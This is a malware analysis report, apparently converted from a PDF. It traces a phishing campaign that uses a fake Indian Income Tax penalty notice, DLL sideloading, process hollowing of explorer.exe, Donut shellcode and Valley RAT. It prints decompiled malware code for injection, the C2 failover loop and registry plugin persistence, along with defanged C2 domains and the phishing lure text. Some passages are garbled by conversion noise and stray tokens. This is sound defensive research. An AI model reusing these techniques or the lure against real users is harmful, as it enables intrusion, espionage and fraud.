/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/\n  \n\nMalicious email  \n\nWe found an interesting email uploaded from India with just an attachment called \"TOPsoE India Private Limited\". The pdf looked like an official Income Tax Department document. Upon clicking on the pdf, \"ggwk[.]cc\" opens up on the browser and a zip file called \"tax affairs.exe\" is downloaded.\n\n<--- Page Split --->\n\nNo. TAX/PEN/2025-142 \n\nभारत सरकार / Government of India\nवित्त मंत्रालय / Ministry of Finance\nआयकर विभाग / Income Tax Department\nप्रवर्तन प्रभाग / Enforcement Division \n\nAayakar Bhavan,\nNew Delhi - 110001 \n\nOFFICE MEMORANDUM \n\nSub: कर अनुपालन की कमी और दंड सूचना / Tax Compliance Deficiency and Penalty Notice \n\n1. आपकी कमनी की कर निरीक्षण के दौरान आयकर अधिनियम, 1961 की धारा 271(1)(c) के तहत कर संबंधी अनियमिताएं पाई गई हैं। The tax inspection of your company has revealed irregularities under Section 271(1)(c) of the Income Tax Act, 1961. \n\n2. इस सूचना की प्राप्ति के 72 घंटे (3 दिन) के भीतर निम्नलिखित दस्तावेज आयकर विभाग को प्रस्तुत करना अनिवार्य है। It is mandatory to submit the following documents to the Income Tax Department within 72 hours (3 days) of receipt of this notice. \n\nआवश्यक दस्तावेज सूची / Required Documents List\nनीचे दिए गए लिंक से दस्तावेज डाउनलोड करें / Download documents from the link below \n\nदस्तावेज डाउनलोड करें / Download Documents \n\n3. निर्धारित समयावधि में दस्तावेज प्रस्तुत न करने पर आयकर अधिनियम की धारा 276C के तहत कानूनी कार्रवाई की जाएगी। Legal action will be taken under Section 276C of the Income Tax Act if documents are not submitted within the stipulated time. \n\n(राज कुमार शर्मा) \n\nRaj Kumar Sharma \n\nसहायक आयकर आयुक्त \n\nAssistant Commissioner of Income Tax \n\nTechnical Analysis \n\nStage - 1: Tax Affairs.zip \n\nPE32 \n\nOperation system: Windows(2000)[1386, 32-bit, GUI] \n\nLinker: Microsoft Linker(10.00.40219) \n\nCompiler: Microsoft Visual C/C++(16.00.40219)[C] \n\nLanguage: C \n\nTool: Visual Studio(2010) \n\n(Heur) Packer: Compressed or packed data[Strange overlay] \n\nInstaller: Nullsoft Scriptable Install System(2.46.5-ANSI) \n\nOverlay: Binary[Offset=0x00034c00,Size=0x002a2e40] \n\nUnknown: Unknown \n\nDetect It Easy \n\nUsing static analysis we see that the given PE file is a 32 bit GUI binary. More importantly, the file is identified as a Nullsoft Scriptable Install system (NSIS) installer. NSIS installers embed their installation script, compressed payloads etc inside the binary itself and we can move ahead to analyse it as an installer driven staging payload.\n\n<--- Page Split --->\nGetTempPathA(0x10000u, PathName); \n\nif ( sub_4032CB() || (GetWindowsDirectoryA(PathName, 0xFFBu), lstrcatA(PathName, \"\\Temp\"), sub_4032CB()) \n\nDeleteFileA(FileName); \n\nError_writing_temporary_file._Make_sure_your_temp_folder_is_val = (const char *)sub_403030(Buffer); \n\nif (!Error_writing_temporary_file._Make_sure_your_temp_folder_is_val ) \n\nif (!dword_433C24 ) \n\n{ \n\nABEL_34: \n\nuExitCode = -1; \n\nuExitCode = sub_4052E6(); \n\ngoto LABEL_35; \n\n} \n\nfor ( i = (CHAR *)sub_40567B(&sz, 0); i >= &sz && sub_4032FF(i, \"_=\", 4); --i ) \n\n; \n\nError_writing_temporary_file._Make_sure_your_temp_folder_is_val = \"Error launching installer\"; \n\nif ( i >= &sz ) \n\n{ \n\n* i = 0; \n\nlpString2_3 = i + 4; \n\nif ( !sub_405EFC(lpString2_3) ) \n\ngoto LABEL_35; \n\nlstrcpyAn_wrp(&lpString1_, lpString2_3); \n\nlstrcpyAn_wrp(Directory, lpString2_3); \n\nError_writing_temporary_file._Make_sure_your_temp_folder_is_val = 0; \n\ngoto LABEL_34; \n\n} \n\nlstrcatA(PathName, \"\\nsu.tmp\"); \n\nif ( lstrcmpiA(PathName, ::lpString2) ) \n\n{ \n\nCreateDirectoryA(PathName, 0); \n\nSetCurrentDirectoryA(PathName); \n\nif ( !lpString1_ ) \n\nlstrcpyAn_wrp(&lpString1_, ::lpString2); \n\nlstrcpyAn_wrp(lpString1_, lpString2); \n\nlstrcpyAn_wrp(&lpString1_0, \"A\"); \n\nn26 = 26;<｜end▁of▁sentence｜>\n\n<center>NSIS Installer </center>  \n\nThe NSIS installer begins by resolving a writable temporary directory using GetTempPathA. If the operation fails, it falls back to C:\\Windows\\Temp, ensuring execution reliability. Once a valid location is identified, the installer creates an NSIS specific working directory (\\~nsu.tmp) and switches the directory to it.  \n\nDropped Files   \n\n<table><tr><td>ndoe &amp;gt; AppData &amp;gt; Local &amp;gt; Temp</td><td></td><td></td><td></td></tr><tr><td>Name</td><td>Date modified</td><td>Type</td><td>Size</td></tr><tr><td>Thunder.exe</td><td>7/24/2024 10:42 PM</td><td>Application</td><td>635 KB</td></tr><tr><td>FastAnimation.dll</td><td>5/27/2025 4:38 AM</td><td>Application extens...</td><td>578 KB</td></tr><tr><td>leakrepair.dll</td><td>5/27/2025 4:40 AM</td><td>Application extens...</td><td>716 KB</td></tr><tr><td>dynlbase.dll</td><td>5/27/2025 4:48 AM</td><td>Application extens...</td><td>1,431 KB</td></tr><tr><td>libaw.dat</td><td>5/27/2025 4:59 AM</td><td>DAT File</td><td>1,121 KB</td></tr><tr><td>DumpUper.ini</td><td>5/27/2025 5:01 AM</td><td>Configuration setti...</td><td>2 KB</td></tr><tr><td>libdefa.dat</td><td>9/16/2025 7:38 AM</td><td>DAT File</td><td>321 KB</td></tr><tr><td>box.ini</td><td>9/25/2025 8:00 PM</td><td>Configuration setti...</td><td>126 KB</td></tr><tr><td>libexpat.dll</td><td>9/25/2025 8:13 PM</td><td>Application extens...</td><td>32 KB</td></tr></table>  \n\nUpon analysis we found that only 2 files are of use to us, Thunder.exe and libexpat.dll. Thunder.exe is a legitimate, digitally signed executable developed by Xunlei (迅雷), commonly distributed as part of the Thunder download manager ecosystem. In this infection chain, the binary itself is not malicious but is abused as a DLL hijacking host. When executed from installer's temporary directory, Thunder.exe loads libexpat.dll from its local path due to default DLL search order. We can confirm this in x64dbg.\n\n<--- Page Split --->\npos: 0%\n\npush eax\n\njmp tax affairs.402008\n\npush F\n\ncall tax affairs.405A65\n\npush 64\n\npush dword ptr ss:[ebp+8]\n\ncall esi\n\ncmp eax,102\n\nje tax affairs.401FFC\n\nlea eax,dword ptr ss:[ebp-8]\n\npush eax\n\npush dword ptr ss:[ebp+8]\n\ncall dword ptr ds:[<GetExitCodeProcess>]\n\ncmp dword ptr ss:[ebp-20],ebx\n\njl tax affairs.40202E\n\npush dword ptr ss:[ebp-8]\n\npush edi\n\ncall tax affairs.40589E\n\njmp tax affairs.40203A\n\ncmp dword ptr ss:[ebp-8],ebx\n\nje tax affairs.40203A\n\nmov dword ptr ss:[ebp-4],1\n\npush dword ptr ss:[ebp+8]<｜end▁of▁sentence｜>\n\n<center>DLL Loading </center>  \n\n## Stage - 2 : libexpat.dll  \n\nThe dropped libexpat.dll does not export any meaningful functions and is never explicitly invoked by Thunder.exe.The dll relies on the windows loader functionality and calls the DLLMain. This callback is invoked unconditionally, regardless of whether the DLL exports any functions or is actively used by the host process.  \n\nLet's take a look at the working of the DLL.  \n\nv4 = IsDebuggerPresent(); \n\nv5 = &unk_100056DC; \n\nif (!v4) \n\nv5 = &unk_100056E4; \n\nLogStatus((char *)&Format_1, v5); \n\nif (v4) \n\n{ \n\nLogStatus((char *)&Format_2); \n\nreturn 0; \n\n} \n\nelse if (CheckSystemResources()) \n\nGetSystemInfo(&SystemInfo); \n\ndwNumberOfProcessors = SystemInfo.dwNumberOfProcessors; \n\nv7 = &unk_1000560C; \n\nif ( SystemInfo.dwNumberOfProcessors < 4 ) \n\nv7 = &unk_10005614; \n\nLogStatus(aCpu, SystemInfo.dwNumberOfProcessors, v7); \n\nif ( dwNumberOfProcessors >= 4 ) \n\n{ \n\nif (!(unsigned __int8)Persistence()) \n\nLogStatus((char *)&Format_3); \n\nToolHelp32Snapshot = CreateToolhelp32Snapshot(2u, 0); \n\nif ( ToolHelp32Snapshot != (HANDLE)-1 ) \n\n{ \n\npe.dwSize = 556; \n\nif ( Process32Firstw(Toolhelp32Snapshot, &pe) ) \n\n{ \n\ndo \n\n{ \n\nv9 = wcscmp(pe.szExeFile, L\"ida.exe\"); \n\nif ( v9 ) \n\nv9 = v9 < 0 ? -1 : 1; \n\nif (!v9 ) \n\nLogStatus((char *)&Format_4, pe.th32ProcessID); \n\nv10 = wcscmp(pe.szExeFile, L\"x64dbg.exe\"); \n\nif ( v10 ) \n\nv10 = v10 < 0 ? -1 : 1; \n\nif (!v10 ) \n\nLogStatus((char *)&Format_5, pe.th32ProcessID); \n\n} \n\nwhile ( Process32Nextw(Toolhelp32Snapshot, &pe) );<｜end▁of▁sentence｜>\n\n\n<--- Page Split --->\n\nThe Main function begins by many anti debugging and sandbox techniques.The DLL performs process enumeration and scans the process list for common analysis and sandbox tools. Also the DLL queries for the system resources checking if minimum requirements are satisfied or not. In addition to that, if it detects any sandbox environment, it terminates the malware.  \n\nif (!DisableWindowsUpdateService() ) \n\nLogStatus((char *)&Format_6); \n\nBlock[0] = 0; \n\nBlock[1] = 0; \n\nv17 = 0; \n\nv18 = 0; \n\nif ( LoadAndDecryptPayload(Block) ) \n\nv11 = ProcessHollowing((int)Block); \n\nFormat = (char *)&unk_100059C0; \n\nif ( v11 ) \n\nFormat = (char *)&byte_100059CC; \n\n} \n\nelse \n\n} \n\nFormat = (char *)&unk_100059E0; \n\n} \n\nLogStatus(Format); \n\nDisableThreadLibraryCalls(hinstDLL); \n\nCreateThread(0, 0, StartAddress, 0, 0, 0); \n\nv13 = Block[0]; \n\nif ( Block[0] ) \n\n} \n\nif ( v17 - (unsigned int)Block[0] >= 0x1000 ) \n\nv13 = (void *)*((_DWORD *)Block[0] - 1); \n\nif ( (unsigned int)((char *)Block[0] - (char *)v13 - 4) > 0x1F ) \n\ninvalid_parameter_noinfo_noreturn(); \n\n} \n\nsub_10003E6E(v13);<｜end▁of▁sentence｜>\n\n<center>Payload Decryption </center>  \n\nOnce the DLL completes its anti analysis checks, it enters the core execution logic. It first disables the Windows Update service(wuauserv) then loads an encrypted payload from the disk. The payload is dynamically resolved and loads the box.ini file from the temporary directory. The file is fully read into memory, decrypted using embedded cryptographic constants and later on executed as shellcode.  \n\n<table><tr><td>00</td><td>01</td><td>02</td><td>03</td><td>04</td><td>05</td><td>06</td><td>07</td><td>08</td><td>09</td><td>OA</td><td>OB</td><td>OC</td><td>OD</td><td>OE</td><td>OF</td></tr><tr><td>9B</td><td>80</td><td>9D</td><td>8E</td><td>89</td><td>C3</td><td>23</td><td>6B</td><td>A6</td><td>95</td><td>C5</td><td>FC</td><td>B7</td><td>2A</td><td>CB</td><td>OD</td></tr><tr><td>D4</td><td>CF</td><td>6B</td><td>FF</td><td>F8</td><td>6F</td><td>AC</td><td>9C</td><td>D8</td><td>94</td><td>6A</td><td>50</td><td>32</td><td>F0</td><td>B1</td><td>FC</td></tr><tr><td>E1</td><td>29</td><td>25</td><td>0D</td><td>5A</td><td>2A</td><td>E7</td><td>A3</td><td>4C</td><td>7B</td><td>54</td><td>A1</td><td>F7</td><td>2B</td><td>4E</td><td>60</td></tr><tr><td>14</td><td>CF</td><td>71</td><td>43</td><td>65</td><td>4B</td><td>B3</td><td>12</td><td>80</td><td>73</td><td>54</td><td>F5</td><td>A4</td><td>0B</td><td>ED</td><td>71</td></tr><tr><td>A6</td><td>6B</td><td>6B</td><td>5C</td><td>0D</td><td>6F</td><td>57</td><td>F0</td><td>F8</td><td>C3</td><td>F6</td><td>15</td><td>F2</td><td>8F</td><td>81</td><td>EB</td></tr><tr><td>6C</td><td>18</td><td>A0</td><td>F4</td><td>DB</td><td>9F</td><td>47</td><td>00</td><td>8C</td><td>A7</td><td>CE</td><td>0E</td><td>EB</td><td>92</td><td>CF</td><td>89</td></tr><tr><td>83</td><td>87</td><td>D0</td><td>70</td><td>D4</td><td>C9</td><td>42</td><td>64</td><td>BF</td><td>78</td><td>8D</td><td>C5</td><td>84</td><td>93</td><td>9B</td><td>90</td></tr><tr><td>74</td><td>BA</td><td>DE</td><td>B5</td><td>E8</td><td>A1</td><td>86</td><td>44</td><td>CC</td><td>AD</td><td>C3</td><td>C0</td><td>7C</td><td>A1</td><td>94</td><td>6F</td></tr><tr><td>54</td><td>62</td><td>72</td><td>F8</td><td>9F</td><td>6F</td><td>C4</td><td>R9</td><td>07</td><td>19</td><td>1D</td><td>F7</td><td>6F</td><td>17</td><td>DN</td><td>8F</td></tr></table>\n\nDecoded text \n\n\"E.ZNA#k!·Aü·*E.\nÖİkyoo-oeo\"jP2&tü\ná)%.Z*ç£L(Tj÷+N'\n.İqCeK°.eStÖn.iq\n!kk\\.ow&oAö.ö..ë\n1. öÜYG.ÇSİ.ë'İn\nf#DpÖÉBdžx.Ä„“>.\nt°Pue;tDİ.ÄÄ|;\"o\nThræšnÄi...-n.ÝÝ<｜end▁of▁sentence｜>\n\n\n<--- Page Split --->\nStartupInfo.dwFlags = STARTF_USESHOWWINDOW; \n\nmemset(&StartupInfo.wShowWindow, 0, 20); \n\nif ( GetFileAttributesA(\"C:\\\\Windows\\\\SysWOW64\\\\explorer.exe\") == -1 ) \n\nLastError = GetLastError(); \n\nLogStatus((char *)&Format_17, \"C:\\\\Windows\\\\SysWOW64\\\\explorer.exe\", LastError); return 0; \n\nif (!CreateProcessA( \n\n\"C:\\\\Windows\\\\SysWOW64\\\\explorer.exe\", \n\n0, \n\n0, \n\n0, \n\n0, \n\nCREATE_SUSPENDED | CREATE_NO_WINDOW, \n\n0, \n\n0, \n\n&StartupInfo, \n\n&ProcessInformation) ) \n\n{ \n\nerr = GetLastError(); \n\nLogStatus((char *)&Format_18, err, \"C:\\\\Windows\\\\SysWOW64\\\\explorer.exe\"); return 0; \n\nLogStatus((char *)&Format_19, ProcessInformation.dwProcessId, ProcessInformation.dwThreadId); Context.ContextFlags = 65543; \n\nif (!GetThreadContext(ProcessInformation.hThread, &Context) ) \n\nerr_1 = GetLastError(); \n\nLogStatus((char *)&Format_20, err_1); \n\nLABEL_7: \n\nCloseHandle(ProcessInformation.hThread); \n\nCloseHandle(ProcessInformation.hProcess);<｜end▁of▁sentence｜>\n\n<center>Process Injection </center>  \n\nThe shellcode is executed using a classic technique called Process Injection. The routine begins by verifying the presence of explorer.exe, which is later used as the target process. The binary is launched in suspended state and the malware retrieves the initial thread context. Further it allocates executable memory inside the remote process via VirtualAllocEx and writes the payload via WriteProcessMemory.  \n\nerrno_t LogStatus(char *Format, ...) \n\nerrno_t result; // eax \n\nint v2; // ecx \n\nsigned int Size; // kr00_4 \n\nvoid *Buffer_3; // edi \n\nsigned int i; // edx \n\nFILE *Stream; // [esp+Ch] [ebp-880h] BYREF \n\n_SYSTEMTIME SystemTime; // [esp+10h] [ebp-87Ch] BYREF \n\nchar Buffer[1024]; // [esp+20h] [ebp-86Ch] BYREF \n\nchar Buffer_2[1092]; // [esp+420h] [ebp-46Ch] BYREF \n\nchar Buffer_1[32]; // [esp+864h] [ebp-28h] BYREF \n\nva_list ArgList; // [esp+898h] [ebp+Ch] BYREF \n\nva_start(ArgList, Format); \n\nStream = 0; \n\nresult = fopen_s(&Stream, \"C:\\\\data.db\", \"ab+\"); \n\nif (!result && Stream) \n\nGetLocalTime(&SystemTime); \n\nsub_10003860(Buffer_1, \"[%04d-%02d-%02d %02d:%02d:%02d]\", SystemTime.wYear); \n\nsub_10001050(Buffer, v2, Format, v2, ArgList); \n\nsub_10003880(Buffer_2, \"%s%s\\n\", (char)Buffer_1); \n\nSize = strlen(Buffer_2); \n\nBuffer_3 = malloc(Size); \n\nif ( Buffer_3 ) \n\nmemcpy(Buffer_3, Buffer_2, Size); \n\nfor ( i = 0; i < Size; ++i ) \n\n*((_BYTE *)Buffer_3 + i) = 89 - (byte_10005A84[i & 7] ^ _ROL1_(*((_BYTE *)Buffer_3 + i), 2)); \n\nfwrite(Buffer_3, 1u, Size, Stream); \n\nfree(Buffer_3);<｜end▁of▁sentence｜>\n  \n\nThe LogStatus function implements an internal logging mechanism used throughout the DLL to record execution progress and error states. The function formats a timestamped log message, appends it to a local file (C:\\data.db), and applies a lightweight custom obfuscation before writing it to disk.\n\n<--- Page Split --->\n<｜end▁of▁sentence｜>\n\n<center>Encrypted Payload in memory </center>  \n\nThe injected payload can be dumped by attaching a debugger to the hollowed explorer.exe process and monitoring the memory region allocated via VirtualAllocEx. Once the payload is written using WriteProcessMemory and execution is redirected, the allocated region can be dumped directly from memory, yielding the next stage payload for analysis.  \n\nE8 C0 C9 01 00 C0 C9 01 00 33 56 67 6A 66 95 EE 1AE..AE..3Vgif+1 87 5C F8 F3 F1 E1 9C 4D FE B8 FB 9E ED 69 D4 A2 +o6n6a0p,u- ii0c AF 92 B5 95 6C 05 E4 4C CF 00 00 00 00 OA 61 C2 \"u1.aII...aA E4 7A BA 59 20 00 CC 85 43 9D 07 BD 84 A1 72 64 azY..I..C..s,ird 87 8D F5 7D 2F 8B 4F BA 65 62 C1 4C 81 4C 42 AD +.6/0eBAL.LB. 4E CE 6F 33 67 E3 86 63 6B 37 39 8E 74 EA 1F 89 Nf03g4tck79Zte.k D1 AA 05 F0 14 E3 29 7E D7 19 CB 5E C3 96 14 6B N*.6.a)~x.E^A-k 9F 2F 0A 75 3C EF 0A EA 05 F8 1E 07 AD D0 81 6E Y/.uc1.e..D.n B8 2E F2 31 BF F5 FB 33 45 B8 7C 16 71 B6 40 D3 .0lz0u3E,1.qf0 70 68 0F B6 38 B9 33 F4 AE F4 60 6A 34 33 D3 4C ph.f8+3o0'j43OL CE 2E F9 08 0F F0 4C 2C E0 0C A7 EB F9 77 6D B5 I.u..6L,a.5eWmu 8F 96 C2 C9 18 01 63 E8 64 5A B4 CE E8 8E 14 BF -AE..cedz'feZ.z 85 BE FB CE F5 37 55 18 A3 FA 31 B2 7E 81 36 39 .n6f7U.fu1~.69 9A 70 DF 6E 59 F3 C2 63 78 81 48 51 DA 01 88 26 apBnY6Acx.HQU.^ 6A 15 E3 36 BA B2 CC 05 D1 63 F5 7A 1B DC D4 8F .6e+1.Nc0z.u0. 15 17 C8 B6 D7 06 8D 05 40 8A A5 38 38 D4 03 B7 .Ef..d5f80. BC AA AE D5 DF BF 0D 5A 14 EB E2 FB 2A 2D 03 16 +o0z.z.eaU~.  \n\nLooking through the decrypted payload we find that the final payload is a Donut generated shellcode. In this setup, Donut is used to wrap a managed payload into raw shellcode, allowing it to be executed entirely from memory without touching disk.  \n\nBinary \n\nShellcode: Donut(0.9.2)[x86] \n\nS ?<｜end▁of▁sentence｜>\n  \n\nWe can dump the Donut payload by using tools like undonut or donut- decryptor.  \n\n## Stage - 4 : Valley RAT  \n\nAfter the Donut loader successfully injects the final payload into the hollowed explorer.exe process, Valley RAT initializes its sophisticated configuration management subsystem. It starts off by setting anti analysis procedures and then invokes a function sub_405E40() to initialize it's configuration and later create a thread for C2 communication.\n\n<--- Page Split --->\nif (!byte_41DA8C ) \n\n{\n\nbyte_41DA8C = 1;\n\n_wcsrev(a0Db1k1Hs0ld0L);\n\nmemset(&src, 0, 0x12A0u);\n\nsub_405D70('L\"p1:\", Source, 0);\n\nsub_405D70('L\"o1:\", Source_2, 0);\n\nsub_405D70('L\"t1:\", 0, (int)&dword_41CA30);\n\nsub_405D70('L\"p2:\", Source_0, 0);\n\nsub_405D70('L\"o2:\", Source_1, 0);\n\nsub_405D70('L\"t2:\", 0, (int)&dword_41CC70);\n\nsub_405D70('L\"p3:\", Source_3, 0);\n\nsub_405D70('L\"o3:\", Source_4, 0);\n\nsub_405D70('L\"t3:\", 0, (int)&dword_41CE80);\n\nsub_405D70('L\"dd:\", word_41CEF0, 0);\n\nsub_405D70('L\"cl:\", word_41CF2C, 0);\n\nsub_405D70('L\"bb:\", &word_41CF4, 0);\n\nsub_405D70('L\"bb:\", &word_41CFF4, 0);\n\nsub_405D70('L\"jp:\", 0, (int)&unk_41D058);\n\nsub_405D70('L\"sx:\", 0, (int)&unk_41D05C);\n\nsub_405D70('L\"bh:\", 0, (int)&unk_41D060);\n\nsub_405D70('L\"ll:\", 0, (int)&unk_41D064);\n\nsub_405D70('L\"dl:\", 0, (int)&unk_41D06C);\n\nsub_405D70('L\"bd:\", 0, (int)&unk_41D074);\n\n//\"|0:db|1:1k|1:hs|0:1d|0:11|0:hb|1:pj|52.9 .5202:zb|0.1:bb|\"\n\n**Primary C2**\n\n**Tertiary C2**\n\n**Delay**\n\n**Interval**\n\n**Build Version**\n\n**Download**\n\n**Shell**\n\n**Keylogger**\n\n**Backdoor**<｜end▁of▁sentence｜>\n\n<center>C2 Configuration </center>  \n\nThe function implements a two stage loading mechanism. It extracts 22 distinct configuration parameters through a parsing function.  \n\n## Stage 1  \n\n## Command & Control Infrastructure (9 parameters):  \n\n- p1:, p2:, p3: - Three-tier C2 server addresses (correlates with b[.]yuxuanow[.]top identified in network analysis)- o1:, o2:, o3: - Corresponding port numbers for each C2 tier- t1:, t2:, t3: - Connection type flags (1 = HTTP/HTTPS, 0 = raw TCP socket)  \n\n## Operational Parameters (5 parameters):  \n\n- dd: - Initial sleep delay (seconds) before first C2 contact- cl: - Callback interval (seconds) between beaconing attempts- bb: - Build/bot version identifier (observed: 1.0)- bz: - Backup C2 address- fz: - Unknown parameter  \n\n## Feature Flags (8 boolean parameters):  \n\n- kl: - Keylogger (1 = enabled, 0 = disabled)- sh: - Remote shell access (1 = enabled, 0 = disabled)- bd: - Full backdoor mode (1 = enabled, 0 = disabled)- dl: - Download/file transfer capability- jp:, sx:, bh:, ll: - Additional feature toggles  \n\n## Stage 2  \n\nAfter loading the embedded configuration, Valley RAT queries the Windows registry for updated C2 infrastructure:\n\n<--- Page Split --->\ncbData = 0; \n\nif (!RegOpenKeyExW(HKEY_CURRENT_USER, L\"Console\", 0, KEY_READ, &phkResult))\nRegQueryValueExW(phkResult, L\"IpDate\", 0, &Type, 0, &cbData); \n\nif ( cbData > 0xA ) \n\nmemset( \n\na0Db1Lk1Hs0Ld0L, // \"|0:db|1:lk|1:hs|0:1d|0:11|0:hb|1:pj\n0, \n\n0x7D0u); \n\nRegQueryValueExW( \n\nphkResult, \n\nL\"IpDate\", \n\n0, \n\n&Type, \n\n(LPBYTE)a0Db1Lk1Hs0Ld0L, \n\n&cbData); \n\nsub_405D70(L\"p1:\", Source, 0); \n\nsub_405D70(L\"o1:\", Source_2, 0); \n\nsub_405D70(L\"t1:\", 0, &dword_41CA30); \n\nsub_405D70(L\"p2:\", Source_0, 0); \n\nsub_405D70(L\"o2:\", Source_1, 0); \n\nsub_405D70(L\"t2:\", 0, &dword_41CC70); \n\nsub_405D70(L\"p3:\", Source_3, 0); \n\nsub_405D70(L\"o3:\", Source_4, 0); \n\nsub_405D70(L\"t3:\", 0, &dword_41CEB0);<｜end▁of▁sentence｜>\n\n<center>Persistence </center>  \n\nIf the registry value exists and exceeds 10 bytes, Valley RAT completely replaces its embedded configuration, then re- parses only the critical C2 parameters (p1 through t3). This allows Silver Fox operators to push updated C2 addresses without deploying new binaries or regaining code execution  \n\nAfter the configuration is loaded. Valley RAT spawns its payload thread(StartAddress) which implements a 3 tier C2 communication loop.  \n\nwhile ( 1 ) \n\n{\n\nnullsub_1();\n\nif ( C2_TOGGLE_FLAG )\n\nwcscpy_s(&current_c2_addr, 0xFFu, config_p2_secondary_c2);\n\nwcscpy_s(&current_c2_port, 0x1Eu, config_o2_secondary_c2);\n\nconnection_type_flag = config_t2_secondary_type;\n\nelse\n\n// Use Primary C2 Config\n\nwcscpy_s(&current_c2_addr, 0xFFu, config_p1_primary_c2);\n\nwcscpy_s(&current_c2_port, 0x1Eu, config_o1_primary_port);\n\nconnection_type_flag = config_t1_primary_type;\n\nC2_TOGGLE_FLAG = C2_TOGGLE_FLAG == 0;\n\nif ( ++failed_connection_counter == 200 )\n\nnullsub_1();\n\nwcscpy_s(&current_c2_addr, 0xFFu, config_p3_tertiary_c2);\n\nwcscpy_s(&current_c2_port, 0x1Eu, config_o3_tertiary_port);\n\nconnection_type_flag = config_t3_tertiary_type;\n\nfailed_connection_counter = 0;\n\nif ( v2 )\n\n(**void (_thiscall ***)(void *))v2)(v2);\n\nv2 = (void *)v15;\n\nif ( connection_type_flag != 1 )<｜end▁of▁sentence｜>\n  \n\nThe communication loop implements multi- tier failover by alternating between primary (p1) and secondary (p2) C2 servers, switching to tertiary (p3) after 200 failures. It supports both HTTP/HTTPS and raw TCP protocols, uses configurable beaconing intervals (cl:) to reduce detection, and delays initial connection (dd:) to evade sandboxes.  \n\nUpon successful connection, Valley RAT sends a \"ready\" beacon (command ID: 4), enables keylogging if configured (kl: flag), and waits for C2 commands. This architecture maps to the discovered infrastructure: b[.jyuxuanow[.]top (103.20.195[.]147) as primary shellcode C2, with secondary/tertiary\n\n<--- Page Split --->\n\ntiers rotating through domains like itdd[.]club, gov- a[.]work, and xzghjec[.]com.  \n\nif (!RegCreateKeyW(HKEY_CURRENT_USER, L\"Console\\\\0\", &hKey)) \n\n{\n\nRegDeleteValueW(hKey, L\"d33f351a4aeea5e608853d1a56661059\");\n\nRegSetValueExW(hKey, L\"d33f351a4aeea5e608853d1a56661059\", 0, REG_BINARY, (const BYTE *)dst, cbData);\n\n}\n\nRegCloseKey(hKey);\n\noperator delete[](dst);\n\n}\n\nArgList_1 = ArgLista;\n\nv8 = _beginthreadex(0, 0, sub_4052C0, ArgLista, 0, 0);\n\ngoto LABEL_21;\n\ntype = 3;\n\nbData = 0;\n\nif (!RegOpenKeyExW(HKEY_CURRENT_USER, L\"Console\\\\0\", 0, KEY_READ, &phkResult))\n\nRegQueryValueExW(phkResult, L\"d33f351a4aeea5e608853d1a56661059\", 0, &Type, 0, &cbData);\n\nif ( cbData > 0xA44 )\n\ndst_1 = (char *)operator new[](cbData);\n\nmemset(dst_1, 0, cbData);\n\nif (!RegQueryValueExW(phkResult, L\"d33f351a4aeea5e608853d1a56661059\", 0, &Type, (LPBYTE)dst_1, &cbData))\n\n{\n\nqmemcpy(&dst_, dst_1, 0xA44u);\n\nlpAddress = VirtualAlloc(0, Size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n\nmemcpy_0(lpAddress, dst_1 + 2628, Size);\n\n}\n\nhKey_1 = hKey;\n\n}\n\nRegCloseKey(phkResult);\n\nArgList_1 = ArgLista;<｜end▁of▁sentence｜>\n  \n\nValley RAT implements a modular plugin architecture that enables dynamic capability extension through registry- based persistence. The malware stores downloaded plugins in HKCU\\Console\\0\\d33f351a4aeea5e608853d1a56661059 a registry value name consistent with Valley RAT's established fingerprint, following the MD5 hash naming convention observed across multiple Valley RAT campaigns. The plugin manager operates in two modes: it either receives modules from the C2 server, allocates executable memory with PAGE_EXECUTE_READWRITE permissions, and persists the 2628- byte configuration plus payload code to the registry as REG_BINARY data, or it retrieves previously stored plugins from the registry, validates them against a 